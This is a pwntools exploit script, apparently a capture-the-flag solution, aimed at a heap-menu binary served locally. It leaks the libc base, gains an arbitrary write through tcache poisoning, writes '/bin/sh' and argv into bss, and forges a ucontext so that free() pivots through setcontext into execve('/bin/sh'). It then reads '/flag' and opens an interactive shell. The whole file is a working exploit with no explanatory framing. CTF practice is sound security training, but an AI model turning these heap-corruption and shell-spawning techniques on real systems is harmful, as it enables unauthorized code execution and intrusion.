from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
elf = context.binary = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld_name = './ld-linux-x86-64.so.2'
context.terminal = ['tmux', 'splitw', '-h']

HOST = '127.0.0.1'
PORT = 18120
server = None
OFFSET_MAIN_ARENA_60 = 0x1ecbe0


def start():
    global server
    if args.LOCAL:
        server = process([ld_name, '--library-path', '.', elf.path])
        sleep(0.2)
        return remote(HOST, 6666)
    return remote(HOST, PORT)


io = start()
ru = lambda x: io.recvuntil(x)


def cmd(choice):
    ru(b'>')
    io.send(p32(choice))


def build(index, size, content=b''):
    return p64(index) + p64(size) + content.ljust(0x90, b'\x00')


def add(index, size, content=b''):
    cmd(1)
    ru(b'>')
    io.send(build(index, size, content))


def edit(index, size, content):
    cmd(2)
    ru(b'>')
    io.send(build(index, size, b'ziran\x00'))
    ru(b'starting to edit:\n')
    io.send(content)


def delete(index):
    cmd(3)
    ru(b'>')
    io.send(build(index, 0, b''))


def show(index):
    cmd(4)
    ru(b'>')
    io.send(build(index, 0, b''))


def poison(base, target):
    add(base, 0x60, b'A')
    add(base + 1, 0x60, b'B')
    delete(base)
    delete(base + 1)
    edit(base + 1, 8, p64(target))
    add(base + 2, 0x60, b'C')
    add(base + 3, 0x60, b'D')
    return base + 3


def write_any(base, addr, data):
    land = poison(base, addr)
    edit(land, len(data), data)


def pwn():
    for i in range(9):
        add(i, 0x90, b'A')

    for i in range(7):
        delete(i)

    delete(7)
    show(7)
    ru(b'leaking...\n')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - OFFSET_MAIN_ARENA_60
    log.success(f'libc base = {hex(libc.address)}')

    # Use the Heap bss area for /bin/sh, argv and x87 env.
    write_any(20, 0x602940, b'/bin/sh\x00')
    write_any(24, 0x602950, p64(0x602940) + p64(0))
    write_any(28, 0x602960, b'\x00' * 0x28)

    # After this edit returns, free(req) jumps into setcontext.
    # req itself is the fake ucontext and returns into execve("/bin/sh", argv, 0).
    payload = bytearray(0x1c0)
    payload[0x28:0x30] = p64(libc.sym['setcontext'])
    payload[0x58:0x60] = p64(0x602940)
    payload[0x60:0x68] = p64(0x602950)
    payload[0x90:0x98] = p64(0x6029d0)
    payload[0x98:0xa0] = p64(libc.sym['execve'])
    payload[0xd0:0xd8] = p64(0x602960)
    payload[0x1b0:0x1b4] = p32(0x1f80)
    write_any(32, 0x601800, bytes(payload))

    io.sendline(b'cat /flag')


if __name__ == '__main__':
    pwn()
    io.interactive()
